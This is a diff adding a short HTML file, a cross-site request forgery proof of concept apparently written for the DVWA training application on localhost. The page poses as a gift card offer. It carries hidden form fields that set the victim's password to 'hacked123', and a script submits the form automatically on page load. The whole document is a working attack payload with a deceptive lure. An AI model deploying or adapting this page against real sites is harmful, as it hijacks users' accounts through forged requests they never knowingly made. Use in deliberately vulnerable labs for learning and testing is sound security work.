@@ -1,0 +1,21 @@
+
+
+<!-- File: csrf-poc.html -->
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>This is a gift card offer!</h2>
+
+    <form action="http://127.0.0.1/dvwa/vulnerabilities/csrf/" method="POST">
+      <input type="hidden" name="password_new" value="hacked123">
+      <input type="hidden" name="password_conf" value="hacked123">
+      <input type="hidden" name="Change" value="Change">
+      <input type="submit" value="Click here to claim">
+    </form>
+
+    <script>
+      // Automatically submit the form when the page loads
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
